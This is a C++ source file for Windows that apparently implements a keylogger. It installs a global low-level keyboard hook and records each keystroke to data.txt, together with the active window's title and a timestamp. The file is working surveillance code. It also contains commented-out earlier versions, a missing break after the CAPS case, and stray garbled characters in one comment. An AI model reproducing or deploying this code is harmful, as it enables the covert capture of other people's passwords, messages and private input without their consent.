#include<time.h>
#include"main.h"
#pragma warning(disable:4996)
#pragma warning(disable:4703)


using namespace std;

HHOOK hook;
ofstream file;

char previousProg[256];

int Save(KBDLLHOOKSTRUCT kbData)
{
	int key = kbData.vkCode;
	if (key == 1 || key == 2) {
		return 0;
	}

	HWND foregroundW = GetForegroundWindow();
	//DWORD pID;
	//HKL kbLayout;

	if (foregroundW) {
		DWORD pID = GetWindowThreadProcessId(foregroundW, NULL);
		HKL kbLayout = GetKeyboardLayout(pID);
		//file << kbLayout << endl;
		char currentProg[256];
		GetWindowTextA(foregroundW, currentProg, 256);
		time_t time_ = time(NULL);
		struct tm* tm = localtime(&time_);
		char buffer[64];
		if (strcmp(previousProg, currentProg) != 0) {
			strcpy_s(previousProg, currentProg);
			strftime(buffer, sizeof(buffer), "%c", tm);
			file << "[" << currentProg << "|" << buffer << "]\n";
		}

		strftime(buffer, sizeof(buffer), "%H:%M:%S", tm);
		file << buffer << "|";

		switch (key)
		{
		case VK_BACK:
			file << "[BACKSPACE]" << endl;
			break;
		case VK_RETURN:
			file << "[ENTER]" << endl;
			break;
		case VK_SPACE:
			file << "[SPACE]" << endl;
			break;
		case VK_SHIFT:
		case VK_LSHIFT:
		case VK_RSHIFT:
			file << "[SHIFT]" << endl;
			break;
		case VK_CONTROL:
		case VK_LCONTROL:
		case VK_RCONTROL:
			file << "[CTRL]" << endl;
			break;
		case VK_ESCAPE:
			file << "[ESC]" << endl;
			break;
		case VK_UP:
			file << "[UP]" << endl;
			break;
		case VK_DOWN:
			file << "[DOWN]" << endl;
			break;
		case VK_LEFT:
			file << "[LEFT]" << endl;
			break;
		case VK_RIGHT:
			file << "[RIGHT]" << endl;
			break;
		case 20:
			file << "[CAPS]" << endl;
		case 109:
		case 189:
			file << "." << endl;
			break;
		case 110:
		case 190:
			file << "-" << endl;
			break;
		default:
			unsigned char keyboardState[256];
			for (int i = 0; i < 256; ++i)
				keyboardState[i] = static_cast<unsigned char>(GetKeyState(i));

			wchar_t wbuffer[3] = { 0 };

			int result = ToUnicodeEx(
				key,
				kbData.scanCode,
				keyboardState,
				wbuffer,
				sizeof(wbuffer) / sizeof(wchar_t),
				0, kbLayout);
			if (result > 0)
			{
				char buffer[5] = { 0 };
				WideCharToMultiByte(CP_ACP, 0, wbuffer, 1, buffer, sizeof(buffer) / sizeof(char), 0, 0);
				file << buffer << endl;
			}
			break;
		}

		//if (key == VK_BACK) { file << "BACKSPACE"; }
		//else if (key == VK_RETURN) { file << "\n"; }
		//else if (key == VK_SPACE) { file << " "; }
		//else if (key == VK_TAB) { file << "[TAB]"; }
		//else if (key == VK_SHIFT || key == VK_LSHIFT) { file << "[SHIFT]"; }
		//else if (key == VK_CONTROL || key == VK_LCONTROL) { file << "[CTRL]"; }
		//else if (key == VK_ESCAPE) { file << "[ESC]"; }
		//else if (key == VK_UP) { file << "[UP]"; }
		//else if (key == VK_DOWN) { file << "[DOWN]"; }
		//else if (key == VK_LEFT) { file << "[LEFT]"; }
		//else if (key == VK_RIGHT) { file << "[RIGHT]"; }
		//else if (key == 190 || key == 110) { file << "."; }
		//else if (key == 189 || key == 109) { file << "-"; }
		//else if (key == 20) { file << "[CAPS]"; }
		//else {
		//	char currentKey;
		//	bool isLower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		//	if (((GetKeyState(VK_SHIFT) & 0x0001) != 0) ||
		//		((GetKeyState(VK_LSHIFT) & 0x0001) != 0)) {
		//		isLower = !isLower;ôûâôâûô
		//	}â
		//	currentKey = MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, kbLayout);
		//	if (!isLower) {
		//		currentKey = tolower(currentKey);
		//	}
		//	file << char(currentKey);
	}
	file.flush();
	return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT kbData = *((KBDLLHOOKSTRUCT*)lParam);
			//BYTE keystate[256];
			//wchar_t bofchar[4];
			//int chhBuff;
			//cout << kbData.scanCode << endl;
			//cout << kbData.dwExtraInfo << endl;
			//cout << kbData.flags << endl;
			//cout << kbData.time << endl;
			//cout << kbData.vkCode << endl;
			//GetKeyboardState((BYTE*)&keystate);
			//ToUnicode(kbData.vkCode, kbData.scanCode, keystate, (LPTSTR)&bofchar, 4, 0);
			////ToAscii(kbData.vkCode, kbData.scanCode, keystate, &bofchar, kbData.flags);
			//cout << "s" << bofchar << endl;
			//cout << endl << endl;
			Save(kbData);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int main()
{
	file.open("data.txt");
	
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0))) {
		exit(1);
	}

	MSG msg;

	for (;;) {
		GetMessage(&msg, NULL, 0, 0);
	}
}


